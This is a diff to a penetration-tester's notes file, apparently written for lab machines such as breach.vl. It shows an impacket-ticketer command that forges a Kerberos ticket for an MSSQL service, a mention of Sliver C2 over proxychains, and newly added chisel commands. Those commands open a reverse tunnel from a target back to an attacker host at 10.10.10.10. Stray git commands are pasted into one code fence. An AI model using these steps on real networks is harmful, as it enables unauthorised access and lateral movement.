@@ -142,7 +142,8 @@ impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl \
 -dc-ip 10.129.197.45 \
 -domain breach.vl \
 -user-id 500 Administrator
-```
+```git checkout dev                       # Go back to dev
+git pull origin dev
 
 
 
@@ -812,6 +813,21 @@ $session_id looks like `5b4640a8`
 
 
 Sliver C2 configured in proxy `SOCKS5` so need to change a `/etc/proxychains.conf` to `SOCKS5` in port `1081`
+
+
+Anouther way to tunnel port by tool `chisel`
+
+In local machine
+
+```bash
+./chisel server -p 8001 --reverse
+```
+
+In target machine where port `8004` it's in which port tunnel in local machine and `8000` what port in target machine to tunnel
+
+```bash
+./chisel.exe client 10.10.10.10:8001 R:8004:127.0.0.1:8000
+```
 
 [[ssh]]
 == SSH
